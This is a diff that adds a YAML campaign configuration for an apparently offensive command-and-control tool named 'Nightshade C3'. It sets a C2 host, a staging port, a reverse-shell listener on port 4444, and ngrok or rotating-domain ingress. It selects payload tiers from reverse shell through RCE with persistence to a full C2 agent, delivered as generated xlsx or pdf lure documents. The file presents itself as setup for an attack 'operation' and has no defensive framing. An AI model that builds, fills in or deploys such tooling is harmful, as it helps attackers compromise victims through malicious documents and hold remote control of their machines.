@@ -1,0 +1,25 @@
+# Nightshade C3 — Campaign Configuration
+# =========================================
+# Edit this file before running to customise your operation.
+
+campaign:
+  name: "default_campaign"
+  encryption_key: "auto"           # "auto" = randomly generated; or set a passphrase
+
+c2:
+  host: "0.0.0.0"
+  staging_port: 8080
+  reverse_shell_port: 4444
+
+ingress:
+  method: "ngrok"                  # "ngrok" | "domain" (rotation) | "custom" | "direct"
+  ngrok_auth_token: ""             # Your ngrok auth token (required for ngrok method)
+  ngrok_region: "us"               # us | eu | au | ap | sa | jp | in
+  custom_domain: ""                # Required when method = "custom"
+
+payload:
+  tier: 2                          # 1=Reverse shell | 2=RCE + Persistence | 3=Full C2 Agent
+  lhost: "127.0.0.1"               # Local IP for reverse shell (Tier 1)
+  lport: 4444                      # Local port for reverse shell (Tier 1)
+  document_type: "auto"            # "xlsx" | "pdf" | "auto" (prompts)
+  output_file: "auto"              # "auto" = generated filename; or set a path
